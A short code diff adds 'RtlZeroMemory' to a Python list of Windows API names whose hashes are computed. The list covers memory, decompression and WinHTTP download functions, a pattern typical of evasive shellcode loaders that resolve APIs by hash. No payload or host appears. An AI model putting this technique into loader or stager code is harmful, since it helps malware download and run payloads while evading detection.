@@ -31,7 +31,8 @@ def _get_api_hashes():
         "RtlMoveMemory", "CreateDecompressor", "Decompress", "CloseDecompressor",
         "WinHttpOpen", "WinHttpConnect", "WinHttpOpenRequest", "WinHttpSendRequest",
         "WinHttpReceiveResponse", "WinHttpQueryDataAvailable", "WinHttpReadData",
-        "WinHttpCloseHandle", "WinHttpCrackUrl", "WinHttpSetOption", "WinHttpQueryHeaders"
+        "WinHttpCloseHandle", "WinHttpCrackUrl", "WinHttpSetOption", "WinHttpQueryHeaders",
+        "RtlZeroMemory"
     ]
     module_names = ["KERNEL32.DLL", "NTDLL.DLL", "CABINET.DLL", "WINHTTP.DLL"]
     
